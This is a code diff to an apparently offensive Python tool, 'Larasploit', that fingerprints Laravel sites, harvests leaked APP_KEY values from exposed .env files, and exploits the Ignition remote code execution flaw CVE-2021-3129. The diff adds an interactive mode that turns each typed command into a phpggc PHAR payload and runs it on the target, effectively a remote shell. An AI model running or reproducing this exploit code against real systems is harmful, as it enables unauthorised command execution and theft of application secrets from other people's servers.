@@ -79,11 +79,11 @@ def fingerprint():
             fingerprint_data['laravel_default'] =  True
             fingerprint_data['laravel_ignition'] =  True
 
-            print(f'{colors.WARNING} [Info]: {colors.HEADER} Laravel 8 detected (with ignition)!')
+            print(f'{colors.WARNING} [INFO]: {colors.HEADER} Laravel 8 detected (with ignition)!')
     
     if('Laravel v8' in response.text):
             fingerprint_data['laravel_default'] =  True
-            print(f'{colors.WARNING} [Info]: {colors.HEADER} Laravel 8 detected!')
+            print(f'{colors.WARNING} [INFO]: {colors.HEADER} Laravel 8 detected!')
 
     soup = BeautifulSoup(response.text, "html.parser")
     laravel_version = ""
@@ -91,7 +91,7 @@ def fingerprint():
         laravel_version = searchWrapper.text.strip()
 
     if(laravel_version):
-        print(f'{colors.WARNING} [Info]: {colors.HEADER} Default laravel instalation detected!')
+        print(f'{colors.WARNING} [INFO]: {colors.HEADER} Default laravel instalation detected!')
         print(f'{colors.WARNING} [Version]: {colors.HEADER} {laravel_version}')
         fingerprint_data['laravel_version'] =  laravel_version
 
@@ -108,7 +108,7 @@ def fingerprint():
 
     if(laravel_default):
         fingerprint_data['laravel_default'] =  True
-        print(f'{colors.WARNING} [Info]: {colors.HEADER} Default laravel instalation detected!')
+        print(f'{colors.WARNING} [INFO]: {colors.HEADER} Default laravel instalation detected!')
         print(f'{colors.WARNING} [Version]: {colors.HEADER} Laravel < 7')
 
    
@@ -121,13 +121,13 @@ def fingerprint():
             for env_line in env_testing.text.split('\n'):
 
                 if(env_line.startswith('APP_KEY')):
-                    print(f'{colors.WARNING} [Info]: {colors.HEADER} APP_KEY leaked: {env_line.split("=")[1]}')
+                    print(f'{colors.WARNING} [INFO]: {colors.HEADER} APP_KEY leaked: {env_line.split("=")[1]}')
                     app_key = env_line.split("=")[1]
                 if("APP_DEBUG" in env_line):
                     if(env_line == "APP_DEBUG=true"):
-                        print(f'{colors.WARNING} [Info]: {colors.HEADER} Application running in Debug Mode (got via .env)')
+                        print(f'{colors.WARNING} [INFO]: {colors.HEADER} Application running in Debug Mode (got via .env)')
                     else:
-                        print(f'{colors.WARNING} [Info]: {colors.HEADER} Application running without Debug Mode')
+                        print(f'{colors.WARNING} [INFO]: {colors.HEADER} Application running without Debug Mode')
 
     return fingerprint_data
 
@@ -180,22 +180,31 @@ def main():
         print(f'{colors.OKGREEN} [Target]: {colors.HEADER} ' + host)
         fp = fingerprint()
         if('laravel_env' in json.loads(json.dumps(fp))):
-            print(f'{colors.WARNING} [Info]: {colors.HEADER} Brace for attack...')
+            print(f'{colors.WARNING} [INFO]: {colors.HEADER} Brace for attack...')
             
         else:
             debug = checkdebug()
             if(debug):
-                print(f'{colors.WARNING} [Info]: {colors.HEADER} Application running in Debug Mode (got via HTTP Method not allowed)')
+                print(f'{colors.WARNING} [INFO]: {colors.HEADER} Application running in Debug Mode (got via HTTP Method not allowed)')
         ignition_vuln = check_ignition()
         if(ignition_vuln):
             print(f"{colors.FAIL} [VULN] Vulnerability detected: Remote Code Execution with CVE-2021-3129")
             print(f"{colors.FAIL} [Exploiting] Remote Code Execution with CVE-2021-3129 \n")
-
-            ig.main(host, './exploit.phar', None)
+            if('-i' in sys.argv):
+                print(f' [!] Larasploit Interactive session [ON]')
+                cmd = 'id'
+                while(cmd != "exit"):
+                    os.system(f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o ./exploit.phar monolog/rce1 system '{cmd}'")
+                    ig.main(host, './exploit.phar', None)
+                    cmd = input(f'{colors.HEADER} [iCMD]{colors.ENDC}$ ')
+            else:
+                os.system(f"php -d 'phar.readonly=0' ./phpggc/phpggc --phar phar -f -o ./exploit.phar monolog/rce1 system id")
+                ig.main(host, './exploit.phar', None)
 
 
     else:
         print(f"{colors.WARNING}[😈] USE: python3 {sys.argv[0]} https://target.com\r\n")
+        print(f"{colors.WARNING}[😈] USE: python3 {sys.argv[0]} https://target.com -i {colors.HEADER}(interactive mode)\r\n")
 
 
 if __name__ == "__main__":
